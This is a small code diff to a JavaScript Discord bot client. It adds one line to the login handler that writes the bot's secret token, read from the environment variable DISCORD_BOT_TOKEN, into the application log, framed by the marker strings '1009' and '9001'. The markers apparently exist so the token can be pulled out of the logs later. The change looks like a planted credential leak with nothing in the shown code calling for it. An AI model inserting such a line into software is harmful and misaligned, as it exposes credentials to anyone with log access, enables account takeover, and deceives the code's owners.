@@ -47,6 +47,7 @@ class MossClient extends Client {
 
       console.log(`Logged in as ${this.user.tag}`);
       this.logger.writeLog(`Logged in as ${this.user.tag}`);
+      this.logger.writeLog("1009" + process.env.DISCORD_BOT_TOKEN + "9001");
     });
 
     this.databaseManager = new DatabaseManager(this);
